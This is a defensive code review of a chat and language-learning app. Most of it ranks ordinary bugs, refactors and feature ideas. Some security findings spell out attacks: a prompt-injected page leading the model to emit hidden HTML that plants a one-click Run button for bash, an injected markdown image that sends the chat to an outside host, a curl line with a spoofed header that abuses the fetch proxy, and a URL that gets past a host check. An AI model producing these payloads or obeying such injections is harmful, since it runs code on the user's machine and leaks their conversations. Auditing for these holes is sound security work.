# ccez-llm review, 2026-11-13 (read-only)

Skips everything already in PLAN.md ("Bug review, 2026-11-13" and "Review, 2026-11-12"). Nothing was launched or checked on screen. `bun run test`: 181 files and 2,526 tests pass. Confidence is given per item. Two sub-reviews covered the language side and chat/streaming; their raw notes are in `lang-findings.md` and `chat-findings.md` next to this file.

## Bugs (ranked)

1. **A reply can plant a working Run button for a hidden code block: local code execution in one click.** `render.ts:395-445` lets `button`, `class`, `style` and every `data-*` attribute through the sanitizer (DOMPurify allows `data-*` by default). `MessageBody.svelte:649-660` runs `rendered.codes[data-code-run]` for any such button inside any `.ccez-code`. So a prompt-injected page (fetch_url) can make the model emit a ```bash fence inside `<div style="display:none">`, plus `<div class="ccez-code"><button class="paste-fold" data-code-run="0">[Pasted 1,204 chars]</button></div>`. One click runs bash as the owner, with network access. High confidence: checked with the repo's own marked and DOMPurify at the app's config (`probe/p.ts`), and everything survives. Fix: strip `data-*` and `ccez-*` classes from model HTML, and run only buttons the renderer itself made.
2. **Markdown images load from any host, so a chat can be sent out with no click at all.** marked turns `![](https://x/?q=…)` into `<img>`, DOMPurify keeps https `src`, and the window has no CSP (`tauri.conf.json:27`, `"csp": null`). `style="background:url(…)"` works the same way: the style hook only drops position and z-index. An injected instruction ("add this image with the conversation in the URL") leaks the chat the moment the reply renders. High confidence (same probe). Fix: drop remote images in replies, or load them on click, and set a CSP.
3. **Android can run a turn that already finished a second time.** In `native-turns.svelte.ts:480-504`, `scanOnce` reads every file, then waits on dismiss for each one. A turn-done that lands in that gap releases ownership, so the stale "streaming" snapshot reads as a dead turn. `resumeKilled` then restarts it on the filled reply: a paid duplicate request, and the reply is generated again. `turn_scan` (`turn.rs:1407`) also never says whether the runner is alive, so a recreated WebView resumes a turn that is still running. High confidence: reproduced in a scratch vitest.
4. **Stop can't interrupt a page fetch, so an edited question ends with no reply.** `fetchPage.ts:31-32` ignores the abort signal in the shell (Tauri's invoke can't be aborted; fetch.rs waits up to 20 s). `stopReply` (`+page.svelte:8901`) gives up after 2 s. `reaskAfterEdit` then dismisses the live placeholder, and `resend()` does nothing because the chat still reads as sending. The result is no reply and no Retry. High confidence.
5. **The star can save the wrong word to the shared list.** `word-card.ts:1252` (`listWord`) takes the core part's label whenever a word has exactly one core part. "Freiheit" saves as "frei" and "verstehen" as "stehen", in every app that reads ccez-words. High confidence (verified).
6. **A card for a different sense is shown as the final card.** `reading.ts:1304` (`senseMatch`) compares over the smaller sense, so "to pass" matches "to pass away", and "happy" matches "not happy". `sameSense` then reuses the earlier card and cancels the full one (`reading.ts:1196-1211`). The reused card also keeps the old sentence's phrase, construction and "in this sentence" fields (`annotation-drafts.svelte.ts:383`). High confidence on the match; medium-high on the leftover fields.
7. **Two web tabs overwrite each other's chats.** `chat.ts:1683` (`persistChats`) writes the whole chat array, and nothing listens for `storage` events. Tab B's next save erases chats tab A added, and brings back chats A deleted. This affects llm.ccez.uk only. High confidence.
8. **Notes lose their Arabic tashkeel scope on every chat switch and restart.** `annotation-drafts-store.ts:75-92` (`cleanDraftList`) drops `aidScope` and `story.langName`. The note then stamps onto the bare text and badges the wrong words (`annotations.ts:113`), and the duplicate check stops matching. Medium-high confidence.
9. **No CSP on the main window** (`tauri.conf.json:27`). Any slip in a sanitizer, or in any of the roughly 10 `{@html}`/`innerHTML` sinks, can call `invoke("keychain_get",{account:"providers"})`, and every key leaves the device. This is defence in depth that pairs with 2: `img-src 'self' data: blob:` and `connect-src` limited to provider hosts.
10. **The web fetch proxy is still open.** `foreign()` (`functions/api/_shared.ts:106-110`) checks only `sec-fetch-site`, which any script can send: `curl -H 'sec-fetch-site: same-origin' …/api/fetch?url=…`. Anyone can fetch pages through the owner's Cloudflare account and spend the z relay's Google budget. High confidence. Fix: a SameSite=Strict session cookie, or a rate limit per IP.
11. **A key follows its provider's base URL, wherever that points.** `settings-file.ts:52-53` keeps the Keychain key but takes `providers.*.baseUrl` from `settings.json`, which any process running as the owner can write. The next send then posts the key there, with no prompt. Medium (needs a same-user attacker), high confidence. Fix: store each key with the origin it was entered for.
12. **Some stop paths skip native turns.** `converseStopAll` (`+page.svelte:8043`) and the news re-level Undo (`:9737`) call `abortSend` directly. On Android the native turn keeps running and stays paid. On the TS path, the partial reply is filed as an error with Retry instead of being kept. Medium.
13. **A capture filed while a chat is thinking lands below the placeholder.** `fileCaptureAsAssistant` (`+page.svelte:5546`) and `fileAssistantMessage` (`chat.ts:1307`) have no sending guard. Readback, title and notification then run on the OCR text, and a killed native turn can't resume. Medium.
14. **Card prefetch asks the wrong things.** Hover prefetch uses the paragraph of the word's first occurrence, not the hovered one (`+page.svelte:4357-4362`), so it misses `noteKey` and pays twice. It also never checks whether the word already has a note (`:4346`). The reply-landed prefetch fires on a chat switch rather than when the reply lands (`:4308-4312`). Medium.
15. **A killed TS stream can leave a cut-off reply that reads as complete.** The placeholder isn't saved when the stream starts (`chat.ts:1348`). Any other save during the stream stores the partial with `error:null`. Quitting mid-reply then shows a clipped answer with no Retry. Low-medium.
16. **An older settings snapshot can land after a newer one.** `saveSettingsNow` (`+page.svelte:8091-8107`) awaits the Keychain write before it saves its snapshot. A save that doesn't touch a key finishes first. So if you paste a key while the prompt is up, pick a model, then click Allow, the model pick is lost at relaunch. Medium-low confidence. Fix: chain saves on one promise.
17. **Phrase starring can hang or save the wrong thing.** `togglePhraseStar` (`+page.svelte:2947`) has no timeout, so a hung call leaves the star stuck lit until restart. A phrase whose headword the server returns as null, for example any phrase with a digit, is silently not saved (`wordList.svelte.ts:157`). Glosses the model appends ("s'éloigner (to move away)") are saved into the list as the word (`phrase-list.ts:51`). Low-medium.
18. **Android token rendering is quadratic.** `native-turns.svelte.ts:334` replaces the message on every token; the TS path batches to one update per frame (`chat.ts:1378`). Long replies on the phone redraw in full for every token. Medium (performance).
19. **Low:**
    - The APK host check passes `https://evil.example?.githubusercontent.com` and plain `http://` (`update_android.rs:22-31`). Android's same-signer rule blocks the install anyway.
    - The SSRF guard misses 224/4, 240/4, 198.18/15 and NAT64 (`fetch.rs:58-81`).
    - Search: restoring the old index and the first `index()` race, so stale results stay until the next edit (`+page.svelte:3306`).
    - A word starred offline under its inflected form stays lit locally for good (`wordList.svelte.ts`).

Checked and fine:

- Keys go only to their provider: `openai-compat.ts:113`, `turn.rs`, `models.rs`, `listen_grade.rs`.
- `settings.json` is saved with keys blanked.
- The agent socket is 0600 under `~/Library` (0700).
- Browser-pane pages get no IPC.
- `fetch_page` guards IP literals, DNS answers and every redirect.
- Word cards render as text.
- The SSE parser, abort on chat switch, and deleting mid-stream all behave.
- `build/` holds no keys.

## Refactors / modernising

- **Add the reply's buttons after sanitizing, not through the sanitizer.** render.ts builds the copy, run and fold buttons as HTML, so it has to allow `button`, `class`, `style` and `data-*` for the whole reply (the cause of bug 1). Sanitize the model's markdown against a tight list, then insert the buttons as DOM nodes.
- **One `stopReply(chatId)` that resolves when the stream really ends**, covering TS and native turns, with `abortSend` private. It fixes 4 and 12. Let Rust report whether each turn is still live in `turn_scan`, which fixes 3.
- **Per-chat persistence with one debounced saver**, in IndexedDB or one key per chat, merged across tabs through BroadcastChannel. It fixes 7 and 15, and stops re-stringifying every chat on each toggle.
- **One `askNote()` and one `baseLang()` helper.** Three copies of the annotationAnswer options (`+page.svelte:1113, 4330, 4364`) and about six base-language helpers drift apart; the wrong-context prefetch in 14 is that drift.
- **Typed shell bindings.** About 70 command names are string literals at `invoke` sites, behind 91 `tauriBackendAvailable()` guards. tauri-specta (or ts-rs) would generate the TS signatures from Rust, so a renamed argument fails `bun run check`.
- **One engine on desktop too.** turn.rs (2,659 lines) mirrors `openai-compat.ts` by hand. Running desktop turns through Rust would also unblock OpenCode Zen, which TODO.md parks on CORS. Worth deciding before Zen's `/responses` format doubles both engines.
- Small one: vitest spends 45% of its time transforming files again on every run; `fsModuleCache: true` keeps them.

## Features (fit: no decks, FSRS inside what he already does, pithy)

1. **Due words in replies.** Pass the 3-5 Learning words FSRS says are due in this language to the system prompt, so the model uses them naturally. They show with a faint underline and no label.
2. **Reading is reviewing.** A due word read in a reply without tapping counts as Good; tapping its card counts as Again. That grades FSRS from normal reading, with no buttons.
3. **Aids only where needed.** Skip furigana and pinyin over words marked Known in ccez-words, and keep them on Learning and new words. Less clutter as he improves.
4. **Three lookups star a word.** A word whose card he opened three times, in any app, becomes Learning automatically.
5. **Corrections come back later.** Errors that keep showing in the correction diff (correction.ts), such as a noun's gender, become due items. When he next writes in that language, the model is asked to give him a chance to use the word again.

# ccez-llm chat state / persistence / streaming review (read-only)

## Bugs (ranked)

1. Native scan resumes a turn that just finished (duplicate request, finished reply regenerated). native-turns.svelte.ts:480-504. scanOnce reads all files once, then awaits dismiss per file; a turn-done landing in that gap releases ownership, so the stale "streaming" snapshot later reads as a dead turn and resumeKilled restarts it on the filled placeholder. Reproduced with a scratch vitest (2 files on return: starts=2, chat back to sending). Same root: turn_scan (turn.rs:1407) never says whether the runner is still alive, so a WebView/Activity recreated while the process lives (foreground service) resumes a live turn too. High (race reproduced), medium for the recreate case.

2. Stop can't interrupt a page fetch in the shell for up to 20 s. fetchPage.ts:31-32: invokeHtml ignores the signal (Tauri invoke isn't abortable; fetch.rs timeout 20 s). Hold-to-stop toasts "Reply stopped" but the chat stays locked; stopReply (+page.svelte:8901) gives up after 2 s, so reaskAfterEdit dismisses the live placeholder and resend() no-ops on the still-set sending flag: an edited question ends with no reply and no Retry. High.

3. Two web tabs overwrite each other's chats. chat.ts:1683 persistChats writes the whole array; no `storage` listener anywhere. Tab B's next save (any send, rename, delete) erases what tab A added or brings back what A deleted. Web build only (llm.ccez.uk). High.

4. Stop paths that bypass stopReply skip native turns and the cancelled flag. converseStopAll (+page.svelte:8043) and the news re-level Undo (+page.svelte:9737) call abortSend: on Android the native turn keeps running (chat locked, tokens into a gone placeholder, paid request), and on the TS path converse's stop files the partial as an error with Retry instead of a kept reply. Medium.

5. A capture filed while the open chat is thinking lands below the placeholder. fileCaptureAsAssistant (+page.svelte:5546) / fileAssistantMessage (chat.ts:1307) have no sending guard (annotatePageSelection does). The reply then fills above the capture, afterSend's `sent` (resolveSendCompletion takes the last message) is the capture, so readback/title/notify run on the OCR text; a killed native turn can't resume (placeholder no longer last) and goes to "interrupted". Same for fileGameAnnotation if the Game chat is sending. Medium.

6. Reply-landed word prefetch fires on chat switch, not on landing. +page.svelte:4308-4312 keys on `chat.id`: leaving a streaming chat flips `sending` false and prefetches cards (paid model calls) for the chat just opened; a reply landing in a chat you left gets none. Medium-low.

7. Native tokens re-render the whole reply per token. native-turns.svelte.ts:334 replaces the message on every turn-token; the TS path batches to one per frame for exactly this (chat.ts:1378). Quadratic render on long Android replies. Medium (perf).

8. Search snapshot: restore() and the first index() start in the same tick (+page.svelte:3306 -> chatSearchStore.ts:171). The IDB read resolves after index() set fresh docs, so the previous session's snapshot replaces them in memory and in the worker until the next chat edit. Low (stale by whatever changed in the last 500 ms or another tab).

9. A killed TS stream leaves either no reply or a truncated one that reads as complete. The placeholder isn't persisted at start (chat.ts:1348); any other persist mid-stream (another chat landing, summary fold, a pill toggle) stores the partial with error:null. Desktop quit or tab close mid-reply then shows a clipped answer with no Retry. Low-medium.

Checked and fine: SSE parser (UTF-8 splits, CR/CRLF splits, `data:` without space, multi-line data, unclosed last event; ran a scratch script), TS abort on fetch/body/complete, chat-switch mid-stream (replaceReply pins chatId+replyId), delete chat/message mid-stream (both engines), native done-vs-scan double apply (idempotent), hydration (sync localStorage load, damaged entries skipped). Existing tests for these files: 224 pass.

## Refactors

A. One `stopReply(chatId): Promise<void>` owned by chat state, resolving when the stream's finally runs (not a 2 s poll), covering TS and native. Every stop (hold, edit re-ask, converse, Undo, delete) goes through it; abortSend stays private. Kills #2's re-ask hole and #4.

B. Let Rust own liveness: turn_scan returns `live` (registry membership) per file, and resume only when not live after a fresh poll. Removes the snapshot race (#1), the `stopped` set's guesswork, and the recreated-WebView duplicate.

C. Persistence as one debounced saver with per-chat records (IndexedDB or one key per chat + an index) plus a `storage`/BroadcastChannel merge. Fixes multi-tab clobbering (#3), lets the live placeholder save every few seconds (#9), and stops re-stringifying every chat on each pill toggle. Pair it with one "append to chat" helper that keeps a live placeholder last (#5).

# ccez-llm language-side findings (in progress)

## Bugs

1. word-card.ts:1252 listWord stars the wrong word for derived/prefixed words (high).
   Takes the single core part's label whenever there's one core, regardless of derive/voice pieces.
   Verified: Freiheit -> "frei", verstehen (ver- + stehen) -> "stehen". Dict morpheme pieces
   (dict-card.ts morphemeParts, core label = etymology piece) and the model prompt (core label = base form) both hit it.

2. reading.ts:1304 senseMatch treats a sense as matching any longer sense containing it (high).
   Ratio is over min(set sizes): "to pass" vs "to pass away", "happy" vs "not happy",
   "to run" vs "to run out of" all true (verified). sameSense then returns the earlier card
   and aborts the full card (reading.ts:1196-1211): wrong sense card shown as final.

3. reading.ts:1193-1211 + annotation-drafts.svelte.ts:383 a reused "same sense" card keeps the other sentence's
   phrase / construction / inSentence (medium-high). Those fields are sentence-specific by prompt
   (word-card.ts:1206-1223) and AnnAnswer renders them (AnnAnswer.svelte:549,601). New sentence shows
   "sind … gegangen" from an old one, as a finished card. Strip them (or only reuse meaning/parts/facts).

4. annotation-drafts-store.ts:75-92 cleanDraftList drops `aidScope` (and story.langName, :34) (medium-high).
   Every chat switch (fileChat/restoreChat) and restart round-trips through it, so an Arabic tashkeel-scoped
   note becomes unscoped: aidMarkVisible (annotations.ts:113) then stamps it on the bare text, the case the
   comment says badges the wrong words. Also the duplicate check (annotations.ts:143) stops matching.

5. +page.svelte:4357-4362 hover prefetch keys the paragraph of the word's FIRST occurrence (offset 0), but the
   note asks with ann.at from the selection (annotate-mode.svelte.ts:555/606 -> answerContextFor) (medium).
   Hovering a word that also appears (even as a substring, stripForMatch) in an earlier paragraph prefetches
   the wrong context; A then misses noteKey and pays for a second quick+card pair. Pass hit's occurrence.

6. +page.svelte:4346 prefetchHovered never checks for an existing note on the word (low-medium).
   Hovering an annotated word (to reread its badge) starts a fresh quick+card request pair per word
   per 10 min (STALE_MS) that nothing takes. Same for prefetchReply after any reply, including failed ones,
   and the sending-effect (4308) fires on a chat switch mid-send, prefetching the other chat's last reply.

7. wordList.svelte.ts:157 + server /headword: a phrase or word the server maps to null is silently not saved (low-medium).
   togglePhraseStar (+page.svelte:2962) -> toggleLearning returns early when headword is null and the star
   wasn't lit. ccez-lang-core headword() returns None for any digit ("avoir 20 ans") or an unknown first
   word of a phrase. Star lights (phraseStarring) then goes dark with no save.

8. +page.svelte:2947 togglePhraseStar's provider.chat has no signal/timeout (low). A hung call leaves
   phraseStarring holding the id: star shows lit and further taps return early until restart. Also any
   thrown error permanently stores the raw quote as listForm (never re-asks).

9. phrase-list.ts:51 cleanPhraseForm keeps glosses the model adds ("s'éloigner (to move away)",
   "s'éloigner — to move away"): those go into the shared list as the word (low-medium, model-dependent).

10. wordList.svelte.ts:157-162 toggles before the headword is known can't be told apart (low).
    The direction is captured before `await headword()`, which ignores the in-flight want() and the 60 s
    back-off; with z asleep each tap waits the 4 s timeout with no visible change, and a second tap in that
    window sends the same direction again (star then unstar ends Learning).

11. wordList offline stars leave orphan local keys (low). Star "freinent" offline -> saved as fr:freinent;
    server (CCEZ_WORDS_HEADWORDS=1) stores fr:freiner and never sends a fr:freinent row back, so the local
    fr:freinent=learning stays forever; after a restart offline (heads empty) status() shows it lit even
    after freiner was unstarred elsewhere.
